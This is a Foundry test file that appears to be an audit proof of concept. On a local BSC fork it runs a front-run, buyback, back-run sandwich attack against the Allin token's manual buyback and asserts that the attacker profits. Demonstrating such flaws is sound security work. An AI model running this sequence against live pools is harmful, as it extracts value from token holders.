// SPDX-License-Identifier: MIT
pragma solidity 0.8.9;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/Allin.sol";

contract AllinSandwichTest is Test {
    Allin token;
    IDEXRouter router;
    address deployer = makeAddr("deployer");
    address attacker = makeAddr("attacker");
    address WBNB;
    address pair;
    
    function setUp() public {
        // Check if BSC RPC URL is set in environment variables
        string memory bsc_rpc_url = vm.envOr("BSC_RPC_URL", string(""));
        if (bytes(bsc_rpc_url).length == 0) {
            vm.skip(true); // Skip entire test if no RPC URL provided
            return;
        }

        // Fork from BSC using provided RPC URL
        vm.createSelectFork(bsc_rpc_url, 15346644);
        
        // Access existing PancakeSwap router
        router = IDEXRouter(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        WBNB = router.WETH();
        
        // Deploy and configure token
        vm.startPrank(deployer);
        token = new Allin();
        token.tradingStatus(true);
        vm.stopPrank();
        
        pair = token.pair();

        // Create liquidity pool
        vm.startPrank(deployer);
        token.approve(address(router), type(uint256).max);
        router.addLiquidityETH{value: 50 ether}(
            address(token),
            100_000 * 10**token.decimals(),
            0,
            0,
            deployer,
            block.timestamp
        );
        vm.stopPrank();
        
        // Fund attacker and token contract
        vm.deal(attacker, 100 ether);
        vm.deal(address(token), 10 ether); // Funds for buyback
    }

    function testSandwichAttackOnBuyback() public {
        // Skip test if environment configuration was missing
        if (vm.envOr("BSC_RPC_URL", bytes("")).length == 0) {
            vm.skip(true);
        }

        // Pre-attack state snapshot
        uint256 initialAttackerBalance = attacker.balance;
        console.log("--- BEFORE-Trigger Attacker Balance ---");
        console.log("Attacker initial ETH balance: ", initialAttackerBalance);
        console.log("");

        console.log("--- Trigger Attack Sequence ---");
        console.log("Executing front-run swap...");
        // Build swap paths
        address[] memory buyPath = new address[](2);
        buyPath[0] = WBNB;
        buyPath[1] = address(token);
        
        address[] memory sellPath = new address[](2);
        sellPath[0] = address(token);
        sellPath[1] = WBNB;

        // Front-run: Attacker buys tokens before buyback
        vm.startPrank(attacker);
        router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 30 ether}(
            0,
            buyPath,
            attacker,
            block.timestamp
        );
        vm.stopPrank();
        console.log("Front-run swap executed");

        console.log("---");
        console.log("Executing vulnerable buyback...");
        // Execute vulnerable buyback
        vm.prank(deployer);
        token.triggerManualBuyback(10 ether, false);
        console.log("Buyback executed");

        console.log("---");
        console.log("Executing back-run swap...");
        // Back-run: Attacker sells tokens after buyback
        vm.startPrank(attacker);
        uint256 tokenBalance = token.balanceOf(attacker);
        token.approve(address(router), tokenBalance);
        
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            sellPath,
            attacker,
            block.timestamp
        );
        vm.stopPrank();
        console.log("Back-run swap executed");
        console.log("");

        // Post-attack state snapshot
        console.log("--- AFTER-Trigger Attacker Balance ---");
        uint256 finalAttackerBalance = attacker.balance;
        console.log("Attacker final ETH balance: ", finalAttackerBalance);

        // Vulnerability verification
        uint256 profit = finalAttackerBalance - initialAttackerBalance;
        console.log("Calculated profit: ", profit);
        console.log("");

        // Final verdict
        if (profit > 0) {
            console.log("Vulnerability Exists: Attack generated profit of %s ETH", profit);
        } else {
            console.log("Vulnerability not Exist: Attack resulted in zero/negative profit");
        }
        console.log("");

        // Maintain original assertion
        assertGt(profit, 0, "Attacker did not profit from sandwich attack");
    }
}